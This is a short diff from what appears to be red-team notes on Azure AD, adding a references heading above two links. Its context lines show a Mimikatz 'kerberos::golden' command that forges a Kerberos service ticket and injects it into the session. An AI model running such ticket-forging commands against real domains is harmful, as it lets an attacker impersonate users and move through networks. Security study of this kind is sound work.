@@ -32,5 +32,6 @@ In order to do so, the following parameters are required:
 ```
 kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:db[...]59 /sid:S-1-5-21-805388781-1469664503-1626361301-1106 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
 ```
+# References
 * [AZURE AD INTRODUCTION FOR RED TEAMERS](https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html)
 * [Password Hash Sync Deep Dive](https://www.eshlomo.us/password-hash-sync-deep-dive/)
